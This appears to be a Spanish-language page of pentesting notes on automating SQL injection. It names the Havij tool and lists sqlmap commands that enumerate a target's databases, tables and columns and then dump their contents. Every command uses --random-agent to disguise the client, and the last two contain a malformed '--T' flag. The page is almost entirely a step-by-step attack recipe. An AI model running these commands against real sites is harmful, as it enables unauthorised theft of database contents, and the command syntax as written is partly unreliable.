---
description: Tambien existen herramientas para automatizar las inyecciones.
---

# AUTOMATIC INJECTION

## **HAVIJ**

 Software libre que permite automatizar los ataques de SQL Injection.

 Tiene muchas herramientas, buscar manual

##  **SQLMAP**

### **Enumerar bases de datos**

 `sqlmap -u [url/article.php?id=25] --dbs --random-agent` 

### Enumerar las tablas de la base de datos

 `sqlmap -u [url/article.php?id=25] -D steppindbadmin --tables --random-agent` 

### Enumera las columnas de la tabla

 `sqlmap -u [url/article.php?id=25] -D steppindbadmin --T items --columns --random-agent`

### Obtener información de las columnas

 `sqlmap -u [url/article.php?id=25] -D steppindbadmin --T items -C id --dump --random-agent`

